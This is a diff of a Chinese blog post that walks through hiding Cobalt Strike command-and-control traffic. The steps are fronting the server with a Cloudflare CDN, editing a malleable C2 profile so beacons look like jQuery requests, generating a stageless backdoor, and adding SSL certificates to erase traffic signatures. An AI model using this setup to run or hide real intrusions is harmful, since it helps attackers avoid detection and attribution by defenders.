@@ -1,651 +1,563 @@
-
-
 <!DOCTYPE html>
-<html lang="zh-CN" data-default-color-scheme=auto>
+<html lang="zh-CN" color-mode="light">
 
-
-
-<head>
-  <meta charset="UTF-8">
-  <link rel="apple-touch-icon" sizes="76x76" href="/img/fluid.png">
-  <link rel="icon" href="/img/ico.jpg">
-  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=5.0, shrink-to-fit=no">
-  <meta http-equiv="x-ua-compatible" content="ie=edge">
-  
-  <meta name="theme-color" content="#2f4154">
-  <meta name="author" content="F4tty">
-  <meta name="keywords" content="">
-  
-    <meta name="description" content="CDN节点上线防拉黑溯源,配置合法SSL证书消除特征,OSS存储shellcode防止拦截">
-<meta property="og:type" content="article">
-<meta property="og:title" content="CobaltStrike流量隐匿">
-<meta property="og:url" content="http://example.com/posts/a28d2b5c/index.html">
-<meta property="og:site_name" content="F4tty">
-<meta property="og:description" content="CDN节点上线防拉黑溯源,配置合法SSL证书消除特征,OSS存储shellcode防止拦截">
-<meta property="og:locale" content="zh_CN">
-<meta property="og:image" content="http://example.com/posts/a28d2b5c/image-20220905230534596.png">
-<meta property="og:image" content="http://example.com/posts/a28d2b5c/image-20220905230629036.png">
-<meta property="og:image" content="http://example.com/posts/a28d2b5c/image-20220906085905127.png">
-<meta property="og:image" content="http://example.com/posts/a28d2b5c/image-20220905231040010.png">
-<meta property="og:image" content="http://example.com/posts/a28d2b5c/image-20220905231515063.png">
-<meta property="og:image" content="http://example.com/posts/a28d2b5c/image-20220905231605856.png">
-<meta property="og:image" content="http://example.com/posts/a28d2b5c/image-20220905231743974.png">
-<meta property="og:image" content="http://example.com/posts/a28d2b5c/image-20220905231849382.png">
-<meta property="og:image" content="http://example.com/posts/a28d2b5c/image-20220906084008556.png">
-<meta property="og:image" content="http://example.com/posts/a28d2b5c/image-20220906090721630.png">
-<meta property="og:image" content="http://example.com/posts/a28d2b5c/image-20220906091200776.png">
-<meta property="og:image" content="http://example.com/posts/a28d2b5c/image-20220906092920872.png">
-<meta property="og:image" content="http://example.com/posts/a28d2b5c/image-20220906100648532.png">
-<meta property="og:image" content="http://example.com/posts/a28d2b5c/image-20220906100919331.png">
-<meta property="og:image" content="http://example.com/posts/a28d2b5c/image-20220906100945570.png">
-<meta property="og:image" content="http://example.com/posts/a28d2b5c/image-20220906104458013.png">
-<meta property="og:image" content="http://example.com/posts/a28d2b5c/image-20220906104537158.png">
-<meta property="og:image" content="http://example.com/posts/a28d2b5c/image-20220906104832429.png">
-<meta property="og:image" content="http://example.com/posts/a28d2b5c/image-20220906105158083.png">
-<meta property="og:image" content="http://example.com/posts/a28d2b5c/image-20220906105336222.png">
-<meta property="og:image" content="http://example.com/posts/a28d2b5c/image-20220906122429149.png">
-<meta property="og:image" content="http://example.com/posts/a28d2b5c/image-20220906162918608.png">
-<meta property="og:image" content="http://example.com/posts/a28d2b5c/image-20220906163921303.png">
-<meta property="og:image" content="http://example.com/posts/a28d2b5c/image-20220906183907524.png">
-<meta property="og:image" content="http://example.com/posts/a28d2b5c/image-20220906184033570.png">
-<meta property="og:image" content="http://example.com/posts/a28d2b5c/image-20220906185553274.png">
-<meta property="og:image" content="http://example.com/posts/a28d2b5c/image-20220906185632114.png">
-<meta property="og:image" content="http://example.com/posts/a28d2b5c/image-20220906185900487.png">
-<meta property="article:published_time" content="2022-09-05T16:00:00.000Z">
-<meta property="article:modified_time" content="2022-09-06T14:08:45.670Z">
-<meta property="article:author" content="F4tty">
-<meta property="article:tag" content="CobaltStrike">
-<meta name="twitter:card" content="summary_large_image">
-<meta name="twitter:image" content="http://example.com/posts/a28d2b5c/image-20220905230534596.png">
+  <head>
+  <meta charset="utf-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1" />
+  <meta name="keywords" content="" />
+  <meta name="author" content="F4tty" />
+  <meta name="description" content="" />
   
   
+  <title>
+    
+      CobaltStrike流量隐匿 
+      
+      
+      |
+    
+     F4tty
+  </title>
+
   
-  <title>CobaltStrike流量隐匿 - F4tty</title>
-
-  <link  rel="stylesheet" href="https://lib.baomitu.com/twitter-bootstrap/4.6.1/css/bootstrap.min.css" />
-
-
-
-  <link  rel="stylesheet" href="https://lib.baomitu.com/github-markdown-css/4.0.0/github-markdown.min.css" />
-
-  <link  rel="stylesheet" href="https://lib.baomitu.com/hint.css/2.7.0/hint.min.css" />
-
-  <link  rel="stylesheet" href="https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.css" />
-
-
-
-<!-- 主题依赖的图标库，不要自行修改 -->
-<!-- Do not modify the link that theme dependent icons -->
-
-<link rel="stylesheet" href="//at.alicdn.com/t/font_1749284_hj8rtnfg7um.css">
-
-
-
-<link rel="stylesheet" href="//at.alicdn.com/t/font_1736178_lbnruvf0jn.css">
-
-
-<link  rel="stylesheet" href="/css/main.css" />
-
-
-  <link id="highlight-css" rel="stylesheet" href="/css/highlight.css" />
-  
-    <link id="highlight-css-dark" rel="stylesheet" href="/css/highlight-dark.css" />
+    <link rel="apple-touch-icon" href="/images/favicon.png">
+    <link rel="icon" href="/img/favicon.ico">
   
 
+  <!-- Raleway-Font -->
+  <link href="https://fonts.googleapis.com/css?family=Raleway&display=swap" rel="stylesheet">
+
+  <!-- hexo site css -->
+  <link rel="stylesheet" href="/css/main.css" />
+  <link rel="stylesheet" href="//at.alicdn.com/t/font_1886449_67xjft27j1l.css" />
+  <!-- 代码块风格 -->
+  
+
+  <!-- jquery3.3.1 -->
+  
+    <script defer type="text/javascript" src="/plugins/jquery.min.js"></script>
+  
+
+  <!-- fancybox -->
+  
+    <link href="/plugins/jquery.fancybox.min.css" rel="stylesheet">
+    <script defer type="text/javascript" src="/plugins/jquery.fancybox.min.js"></script>
+  
+  
+<script src="/js/fancybox.js"></script>
 
 
+  
 
-  <script id="fluid-configs">
-    var Fluid = window.Fluid || {};
-    Fluid.ctx = Object.assign({}, Fluid.ctx)
-    var CONFIG = {"hostname":"example.com","root":"/","version":"1.9.2","typing":{"enable":true,"typeSpeed":70,"cursorChar":"_","loop":false,"scope":[]},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"left","visible":"hover","icon":""},"progressbar":{"enable":true,"height_px":3,"color":"#29d","options":{"showSpinner":false,"trickleSpeed":100}},"code_language":{"enable":true,"default":"TEXT"},"copy_btn":true,"image_caption":{"enable":true},"image_zoom":{"enable":true,"img_url_replace":["",""]},"toc":{"enable":true,"placement":"right","headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":0},"lazyload":{"enable":true,"loading_img":"/img/loading.gif","onlypost":false,"offset_factor":2},"web_analytics":{"enable":false,"follow_dnt":true,"baidu":null,"google":null,"gtag":null,"tencent":{"sid":null,"cid":null},"woyaola":null,"cnzz":null,"leancloud":{"app_id":null,"app_key":null,"server_url":null,"path":"window.location.pathname","ignore_local":false}},"search_path":"/local-search.xml"};
+  
 
-    if (CONFIG.web_analytics.follow_dnt) {
-      var dntVal = navigator.doNotTrack || window.doNotTrack || navigator.msDoNotTrack;
-      Fluid.ctx.dnt = dntVal && (dntVal.startsWith('1') || dntVal.startsWith('yes') || dntVal.startsWith('on'));
+  <script>
+    var html = document.documentElement
+    const colorMode = localStorage.getItem('color-mode')
+    if (colorMode) {
+      document.documentElement.setAttribute('color-mode', colorMode)
     }
   </script>
-  <script  src="/js/utils.js" ></script>
-  <script  src="/js/color-schema.js" ></script>
-  
-
-
-  
 <meta name="generator" content="Hexo 6.2.0"></head>
 
 
-<body>
-  
-
-  <header>
-    
-
-<div class="header-inner" style="height: 70vh;">
-  <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
-  <div class="container">
-    <a class="navbar-brand" href="/">
-      <strong>F4tty&#39;s Note</strong>
+  <body>
+    <div id="app">
+      <div class="header">
+  <div class="avatar">
+    <a href="/">
+      <!-- 头像取消懒加载，添加no-lazy -->
+      
+        <img src="/img/avatar.jpg" alt="">
+      
     </a>
-
-    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
-            data-target="#navbarSupportedContent"
-            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
-      <div class="animated-icon"><span></span><span></span><span></span></div>
-    </button>
-
-    <!-- Collapsible content -->
-    <div class="collapse navbar-collapse" id="navbarSupportedContent">
-      <ul class="navbar-nav ml-auto text-center">
-        
-          
-          
-          
-          
-            <li class="nav-item">
-              <a class="nav-link" href="/">
-                <i class="iconfont icon-home-fill"></i>
-                首页
-              </a>
-            </li>
-          
-        
-          
-          
-          
-          
-            <li class="nav-item">
-              <a class="nav-link" href="/archives/">
-                <i class="iconfont icon-archive-fill"></i>
-                归档
-              </a>
-            </li>
-          
-        
-          
-          
-          
-          
-            <li class="nav-item">
-              <a class="nav-link" href="/categories/">
-                <i class="iconfont icon-category-fill"></i>
-                分类
-              </a>
-            </li>
-          
-        
-          
-          
-          
-          
-            <li class="nav-item">
-              <a class="nav-link" href="/tags/">
-                <i class="iconfont icon-tags-fill"></i>
-                标签
-              </a>
-            </li>
-          
-        
-          
-          
-          
-          
-            <li class="nav-item">
-              <a class="nav-link" href="/about/">
-                <i class="iconfont icon-user-fill"></i>
-                关于
-              </a>
-            </li>
-          
-        
-        
-          <li class="nav-item" id="search-btn">
-            <a class="nav-link" target="_self" href="javascript:;" data-toggle="modal" data-target="#modalSearch" aria-label="Search">
-              &nbsp;<i class="iconfont icon-search"></i>&nbsp;
-            </a>
-          </li>
-          
-        
-        
-          <li class="nav-item" id="color-toggle-btn">
-            <a class="nav-link" target="_self" href="javascript:;" aria-label="Color Toggle">&nbsp;<i
-                class="iconfont icon-dark" id="color-toggle-icon"></i>&nbsp;</a>
-          </li>
-        
-      </ul>
-    </div>
+    <div class="nickname"><a href="/">F4tty</a></div>
   </div>
-</nav>
+  <div class="navbar">
+    <ul>
+      
+        <li class="nav-item" data-path="/">
+          <a href="/">主页</a>
+        </li>
+      
+        <li class="nav-item" data-path="/archives/">
+          <a href="/archives/">归档</a>
+        </li>
+      
+        <li class="nav-item" data-path="/categories/">
+          <a href="/categories/">分类</a>
+        </li>
+      
+        <li class="nav-item" data-path="/tags/">
+          <a href="/tags/">标签</a>
+        </li>
+      
+        <li class="nav-item" data-path="/friends/">
+          <a href="/friends/">友链</a>
+        </li>
+      
+        <li class="nav-item" data-path="/about/">
+          <a href="/about/">关于我</a>
+        </li>
+      
+    </ul>
+  </div>
+</div>
+
+
+<script src="/js/activeNav.js"></script>
+
+
+
+      <div class="flex-container">
+        <!-- 文章详情页，展示文章具体内容，url形式：https://yoursite/文章标题/ -->
+<!-- 同时为「标签tag」，「朋友friend」，「分类categories」，「关于about」页面的承载页面，具体展示取决于page.type -->
+
+
+  <!-- LaTex Display -->
+
+  
+    <script async type="text/javascript" src="/plugins/mathjax/tex-chtml.js"></script>
+  
+  <script>
+    MathJax = {
+      tex: {
+        inlineMath: [['$', '$'], ['\\(', '\\)']]
+      }
+    }
+  </script>
+
+
+
+
+
+  <!-- clipboard -->
+
+  
+    <script async type="text/javascript" src="/plugins/clipboard.min.js"></script>
+  
+  
+<script src="/js/codeCopy.js"></script>
+
+
+
+
+
+
 
   
 
-<div id="banner" class="banner" parallax=true
-     style="background: url('/img/indexbg.png') no-repeat center center; background-size: cover;">
-  <div class="full-bg-img">
-    <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
-      <div class="banner-text text-center fade-in-up">
-        <div class="h2">
-          
-            <span id="subtitle" data-typed-text="CobaltStrike流量隐匿"></span>
-          
-        </div>
+  
 
+  
+
+  
+  <!-- 文章内容页 url形式：https://yoursite/文章标题/ -->
+  <div class="container post-details" id="post-details">
+    <div class="post-content">
+      <div class="post-title">CobaltStrike流量隐匿</div>
+      <div class="post-attach">
+        <span class="post-pubtime">
+          <i class="iconfont icon-updatetime mr-10" title="更新时间"></i>
+          2022-09-06 00:00:00
+        </span>
         
-          
-  <div class="mt-3">
-    
-    
-      <span class="post-meta">
-        <i class="iconfont icon-date-fill" aria-hidden="true"></i>
-        <time datetime="2022-09-06 00:00" pubdate>
-          2022年9月6日 凌晨
-        </time>
-      </span>
-    
-  </div>
-
-  <div class="mt-1">
-    
-      <span class="post-meta mr-2">
-        <i class="iconfont icon-chart"></i>
-        
-          3.4k 字
-        
-      </span>
-    
-
-    
-      <span class="post-meta mr-2">
-        <i class="iconfont icon-clock-fill"></i>
-        
-        
-        
-          29 分钟
-        
-      </span>
-    
-
-    
-    
-  </div>
-
-
-        
-      </div>
-
-      
-    </div>
-  </div>
-</div>
-
-</div>
-
-  </header>
-
-  <main>
-    
-      
-
-<div class="container-fluid nopadding-x">
-  <div class="row nomargin-x">
-    <div class="side-col d-none d-lg-block col-lg-2">
-      
-
-    </div>
-
-    <div class="col-lg-8 nopadding-x-md">
-      <div class="container nopadding-x-md" id="board-ctn">
-        <div id="board">
-          <article class="post-content mx-auto">
-            <!-- SEO header -->
-            <h1 style="display: none">CobaltStrike流量隐匿</h1>
-            
-            
-              <div class="markdown-body">
+              <span class="post-tags">
+                <i class="iconfont icon-tags mr-10" title="标签"></i>
                 
-                <h1 id="CobaltStrike流量隐匿"><a href="#CobaltStrike流量隐匿" class="headerlink" title="CobaltStrike流量隐匿"></a>CobaltStrike流量隐匿</h1><h2 id="防朔源拉黑-CDN节点"><a href="#防朔源拉黑-CDN节点" class="headerlink" title="防朔源拉黑-CDN节点"></a>防朔源拉黑-CDN节点</h2><h4 id="1、在godaddy注册账号，买个域名"><a href="#1、在godaddy注册账号，买个域名" class="headerlink" title="1、在godaddy注册账号，买个域名"></a>1、在godaddy注册账号，买个域名</h4><p><a target="_blank" rel="noopener" href="https://sg.godaddy.com/">https://sg.godaddy.com/</a></p>
-<h4 id="2、在cloudflare注册账号-然后添加域名"><a href="#2、在cloudflare注册账号-然后添加域名" class="headerlink" title="2、在cloudflare注册账号,然后添加域名"></a>2、在cloudflare注册账号,然后添加域名</h4><p><a target="_blank" rel="noopener" href="https://dash.cloudflare.com/">https://dash.cloudflare.com/</a><br><img src="/posts/a28d2b5c/image-20220905230534596.png" srcset="/img/loading.gif" lazyload alt="image-20220905230534596"><br><img src="/posts/a28d2b5c/image-20220905230629036.png" srcset="/img/loading.gif" lazyload alt="image-20220905230629036"><br>这里只是测试选不要钱的实战尽量选择付费的节点多一点</p>
-<h4 id="3、添加解析记录，指向CS的IP"><a href="#3、添加解析记录，指向CS的IP" class="headerlink" title="3、添加解析记录，指向CS的IP"></a>3、添加解析记录，指向CS的IP</h4><p><img src="/posts/a28d2b5c/image-20220906085905127.png" srcset="/img/loading.gif" lazyload alt="image-20220906085905127"><br>type选择A Name随便 IPv4为自己的cs服务端地址  保存继续</p>
-<h4 id="4、配置DNS服务器，使用cloudflare"><a href="#4、配置DNS服务器，使用cloudflare" class="headerlink" title="4、配置DNS服务器，使用cloudflare"></a>4、配置DNS服务器，使用cloudflare</h4><p>按照说明配置DNS服务器<br><img src="/posts/a28d2b5c/image-20220905231040010.png" srcset="/img/loading.gif" lazyload alt="image-20220905231040010"><br>先去godaddy修改域名服务器–进入到域名DNS管理往下拉<br><img src="/posts/a28d2b5c/image-20220905231515063.png" srcset="/img/loading.gif" lazyload alt="image-20220905231515063"><br><img src="/posts/a28d2b5c/image-20220905231605856.png" srcset="/img/loading.gif" lazyload alt="image-20220905231605856"><br>修改为cloudflare显示的内容，修改完成后回到cloudflare 点击进行检测<br><img src="/posts/a28d2b5c/image-20220905231743974.png" srcset="/img/loading.gif" lazyload alt="image-20220905231743974"><br><img src="/posts/a28d2b5c/image-20220905231849382.png" srcset="/img/loading.gif" lazyload alt="image-20220905231849382"><br>等待检查完成<br><img src="/posts/a28d2b5c/image-20220906084008556.png" srcset="/img/loading.gif" lazyload alt="image-20220906084008556"><br>收到邮件后用超级ping测试</p>
-<h4 id="5、下载C2文件模版，修改配置并上传"><a href="#5、下载C2文件模版，修改配置并上传" class="headerlink" title="5、下载C2文件模版，修改配置并上传"></a>5、下载C2文件模版，修改配置并上传</h4><p><a target="_blank" rel="noopener" href="https://github.com/threatexpress/malleable-c2">https://github.com/threatexpress/malleable-c2</a><br>选择CS对应的版本修改 我是4.5版本就修改jquery-c2.4.5.profile<br>搜索http get<br><img src="/posts/a28d2b5c/image-20220906090721630.png" srcset="/img/loading.gif" lazyload alt="image-20220906090721630"><br>修改为:</p>
-<figure class="highlight abnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs abnf">http-get &#123;<br>    set uri <span class="hljs-string">&quot;/jquery-3.3.1.min.js&quot;</span><span class="hljs-comment">;</span><br>    set verb <span class="hljs-string">&quot;GET&quot;</span><span class="hljs-comment">;</span><br>    client &#123;<br>        header <span class="hljs-string">&quot;Accept&quot;</span> <span class="hljs-string">&quot;text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8&quot;</span><span class="hljs-comment">;</span><br>        header <span class="hljs-string">&quot;Host&quot;</span> <span class="hljs-string">&quot;你配置的域名&quot;</span><span class="hljs-comment">;</span><br>        header <span class="hljs-string">&quot;Referer&quot;</span> <span class="hljs-string">&quot;http://你配置的域名/&quot;</span><span class="hljs-comment">;</span><br>        header <span class="hljs-string">&quot;Accept-Encoding&quot;</span> <span class="hljs-string">&quot;gzip, deflate&quot;</span><span class="hljs-comment">;</span><br>        metadata &#123;<br>            base64url<span class="hljs-comment">;</span><br>            prepend <span class="hljs-string">&quot;__cfduid=&quot;</span><span class="hljs-comment">;</span><br>            header <span class="hljs-string">&quot;Cookie&quot;</span><span class="hljs-comment">;</span><br>        &#125;<br>    &#125;<br></code></pre></td></tr></table></figure>
-<p>搜索http post<br><img src="/posts/a28d2b5c/image-20220906091200776.png" srcset="/img/loading.gif" lazyload alt="image-20220906091200776"><br>修改为:</p>
-<figure class="highlight abnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs abnf">http-post &#123;<br>    set uri <span class="hljs-string">&quot;/jquery-3.3.2.min.js&quot;</span><span class="hljs-comment">;</span><br>    set verb <span class="hljs-string">&quot;POST&quot;</span><span class="hljs-comment">;</span><br>    client &#123;<br>        header <span class="hljs-string">&quot;Accept&quot;</span> <span class="hljs-string">&quot;text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8&quot;</span><span class="hljs-comment">;</span><br>        header <span class="hljs-string">&quot;Host&quot;</span> <span class="hljs-string">&quot;www.woaikansese.shop&quot;</span><span class="hljs-comment">;</span><br>        header <span class="hljs-string">&quot;Referer&quot;</span> <span class="hljs-string">&quot;http://www.woaikansese.shop/&quot;</span><span class="hljs-comment">;</span><br>        header <span class="hljs-string">&quot;Accept-Encoding&quot;</span> <span class="hljs-string">&quot;gzip, deflate&quot;</span><span class="hljs-comment">;       </span><br>        id &#123;<br>            mask<span class="hljs-comment">;       </span><br>            base64url<span class="hljs-comment">;</span><br>            parameter <span class="hljs-string">&quot;__cfduid&quot;</span><span class="hljs-comment">;            </span><br>        &#125;       <br>        output &#123;<br>            mask<span class="hljs-comment">;</span><br>            base64url<span class="hljs-comment">;</span><br>            print<span class="hljs-comment">;</span><br>        &#125;<br>    &#125;<br></code></pre></td></tr></table></figure>
+                <span class="span--tag mr-8">
+                  <a href="/tags/CobaltStrike/" title="CobaltStrike">
+                    #CobaltStrike
+                  </a>
+                </span>
+                
+              </span>
+          
+      </div>
+      <div class="markdown-body">
+        <h1 id="CobaltStrike流量隐匿"><a href="#CobaltStrike流量隐匿" class="headerlink" title="CobaltStrike流量隐匿"></a>CobaltStrike流量隐匿</h1><h2 id="防朔源拉黑-CDN节点"><a href="#防朔源拉黑-CDN节点" class="headerlink" title="防朔源拉黑-CDN节点"></a>防朔源拉黑-CDN节点</h2><h4 id="1、在godaddy注册账号，买个域名"><a href="#1、在godaddy注册账号，买个域名" class="headerlink" title="1、在godaddy注册账号，买个域名"></a>1、在godaddy注册账号，买个域名</h4><p><a target="_blank" rel="noopener" href="https://sg.godaddy.com/">https://sg.godaddy.com/</a></p>
+<h4 id="2、在cloudflare注册账号-然后添加域名"><a href="#2、在cloudflare注册账号-然后添加域名" class="headerlink" title="2、在cloudflare注册账号,然后添加域名"></a>2、在cloudflare注册账号,然后添加域名</h4><p><a target="_blank" rel="noopener" href="https://dash.cloudflare.com/">https://dash.cloudflare.com/</a><br><img src="/posts/a28d2b5c/image-20220905230534596.png" alt="image-20220905230534596"><br><img src="/posts/a28d2b5c/image-20220905230629036.png" alt="image-20220905230629036"><br>这里只是测试选不要钱的实战尽量选择付费的节点多一点</p>
+<h4 id="3、添加解析记录，指向CS的IP"><a href="#3、添加解析记录，指向CS的IP" class="headerlink" title="3、添加解析记录，指向CS的IP"></a>3、添加解析记录，指向CS的IP</h4><p><img src="/posts/a28d2b5c/image-20220906085905127.png" alt="image-20220906085905127"><br>type选择A Name随便 IPv4为自己的cs服务端地址  保存继续</p>
+<h4 id="4、配置DNS服务器，使用cloudflare"><a href="#4、配置DNS服务器，使用cloudflare" class="headerlink" title="4、配置DNS服务器，使用cloudflare"></a>4、配置DNS服务器，使用cloudflare</h4><p>按照说明配置DNS服务器<br><img src="/posts/a28d2b5c/image-20220905231040010.png" alt="image-20220905231040010"><br>先去godaddy修改域名服务器–进入到域名DNS管理往下拉<br><img src="/posts/a28d2b5c/image-20220905231515063.png" alt="image-20220905231515063"><br><img src="/posts/a28d2b5c/image-20220905231605856.png" alt="image-20220905231605856"><br>修改为cloudflare显示的内容，修改完成后回到cloudflare 点击进行检测<br><img src="/posts/a28d2b5c/image-20220905231743974.png" alt="image-20220905231743974"><br><img src="/posts/a28d2b5c/image-20220905231849382.png" alt="image-20220905231849382"><br>等待检查完成<br><img src="/posts/a28d2b5c/image-20220906084008556.png" alt="image-20220906084008556"><br>收到邮件后用超级ping测试</p>
+<h4 id="5、下载C2文件模版，修改配置并上传"><a href="#5、下载C2文件模版，修改配置并上传" class="headerlink" title="5、下载C2文件模版，修改配置并上传"></a>5、下载C2文件模版，修改配置并上传</h4><p><a target="_blank" rel="noopener" href="https://github.com/threatexpress/malleable-c2">https://github.com/threatexpress/malleable-c2</a><br>选择CS对应的版本修改 我是4.5版本就修改jquery-c2.4.5.profile<br>搜索http get<br><img src="/posts/a28d2b5c/image-20220906090721630.png" alt="image-20220906090721630"><br>修改为:</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">http-get &#123;</span><br><span class="line">    set uri &quot;/jquery-3.3.1.min.js&quot;;</span><br><span class="line">    set verb &quot;GET&quot;;</span><br><span class="line">    client &#123;</span><br><span class="line">        header &quot;Accept&quot; &quot;text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8&quot;;</span><br><span class="line">        header &quot;Host&quot; &quot;你配置的域名&quot;;</span><br><span class="line">        header &quot;Referer&quot; &quot;http://你配置的域名/&quot;;</span><br><span class="line">        header &quot;Accept-Encoding&quot; &quot;gzip, deflate&quot;;</span><br><span class="line">        metadata &#123;</span><br><span class="line">            base64url;</span><br><span class="line">            prepend &quot;__cfduid=&quot;;</span><br><span class="line">            header &quot;Cookie&quot;;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
+<p>搜索http post<br><img src="/posts/a28d2b5c/image-20220906091200776.png" alt="image-20220906091200776"><br>修改为:</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">http-post &#123;</span><br><span class="line">    set uri &quot;/jquery-3.3.2.min.js&quot;;</span><br><span class="line">    set verb &quot;POST&quot;;</span><br><span class="line">    client &#123;</span><br><span class="line">        header &quot;Accept&quot; &quot;text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8&quot;;</span><br><span class="line">        header &quot;Host&quot; &quot;www.woaikansese.shop&quot;;</span><br><span class="line">        header &quot;Referer&quot; &quot;http://www.woaikansese.shop/&quot;;</span><br><span class="line">        header &quot;Accept-Encoding&quot; &quot;gzip, deflate&quot;;       </span><br><span class="line">        id &#123;</span><br><span class="line">            mask;       </span><br><span class="line">            base64url;</span><br><span class="line">            parameter &quot;__cfduid&quot;;            </span><br><span class="line">        &#125;       </span><br><span class="line">        output &#123;</span><br><span class="line">            mask;</span><br><span class="line">            base64url;</span><br><span class="line">            print;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
 <p>修改完成后将修改的文件上传的CS的服务端</p>
-<h4 id="6、启动CS加载CS模版，"><a href="#6、启动CS加载CS模版，" class="headerlink" title="6、启动CS加载CS模版，"></a>6、启动CS加载CS模版，</h4><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">./teamserver x.x.x.x passwd jquery-c2.4.5.profile<br></code></pre></td></tr></table></figure>
-<p>创建监听器<br><img src="/posts/a28d2b5c/image-20220906092920872.png" srcset="/img/loading.gif" lazyload alt="image-20220906092920872"><br><strong>注意1：</strong><br>因为cloudflare的原因这里端口的设置需要注意以下：<br>若是http，则只能设置80,8080,8880,2052,2082,2086,2095这些端口号<br>若是https，则只能设置443,2053,2083,2087,2096,8443这些端口号<br><strong>注意2：</strong><br>后门生成使用Stageless模式<br><img src="/posts/a28d2b5c/image-20220906100648532.png" srcset="/img/loading.gif" lazyload alt="image-20220906100648532"><br>成功上线<br>用火绒剑分析下<br><img src="/posts/a28d2b5c/image-20220906100919331.png" srcset="/img/loading.gif" lazyload alt="image-20220906100919331"><br><img src="/posts/a28d2b5c/image-20220906100945570.png" srcset="/img/loading.gif" lazyload alt="image-20220906100945570"><br>ip地址为CDN地址</p>
-<h2 id="防特征审计-SSL证书"><a href="#防特征审计-SSL证书" class="headerlink" title="防特征审计-SSL证书"></a>防特征审计-SSL证书</h2><h4 id="1、配置SSL设置"><a href="#1、配置SSL设置" class="headerlink" title="1、配置SSL设置"></a>1、配置SSL设置</h4><p>创建证书（SSL-源服务器）<br>在cloudflare创建证书<br><img src="/posts/a28d2b5c/image-20220906104458013.png" srcset="/img/loading.gif" lazyload alt="image-20220906104458013"><br><img src="/posts/a28d2b5c/image-20220906104537158.png" srcset="/img/loading.gif" lazyload alt="image-20220906104537158"><br>将Origin Certificate保存到本地命名为sever.pem,Private Key保存为sever.key<br><img src="/posts/a28d2b5c/image-20220906104832429.png" srcset="/img/loading.gif" lazyload alt="image-20220906104832429"><br>设置页面规则(缓存级别-绕过)<br><img src="/posts/a28d2b5c/image-20220906105158083.png" srcset="/img/loading.gif" lazyload alt="image-20220906105158083"><br><img src="/posts/a28d2b5c/image-20220906105336222.png" srcset="/img/loading.gif" lazyload alt="image-20220906105336222"><br>url处为域名加上&#x2F;*js</p>
+<h4 id="6、启动CS加载CS模版，"><a href="#6、启动CS加载CS模版，" class="headerlink" title="6、启动CS加载CS模版，"></a>6、启动CS加载CS模版，</h4><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./teamserver x.x.x.x passwd jquery-c2.4.5.profile</span><br></pre></td></tr></table></figure>
+<p>创建监听器<br><img src="/posts/a28d2b5c/image-20220906092920872.png" alt="image-20220906092920872"><br><strong>注意1：</strong><br>因为cloudflare的原因这里端口的设置需要注意以下：<br>若是http，则只能设置80,8080,8880,2052,2082,2086,2095这些端口号<br>若是https，则只能设置443,2053,2083,2087,2096,8443这些端口号<br><strong>注意2：</strong><br>后门生成使用Stageless模式<br><img src="/posts/a28d2b5c/image-20220906100648532.png" alt="image-20220906100648532"><br>成功上线<br>用火绒剑分析下<br><img src="/posts/a28d2b5c/image-20220906100919331.png" alt="image-20220906100919331"><br><img src="/posts/a28d2b5c/image-20220906100945570.png" alt="image-20220906100945570"><br>ip地址为CDN地址</p>
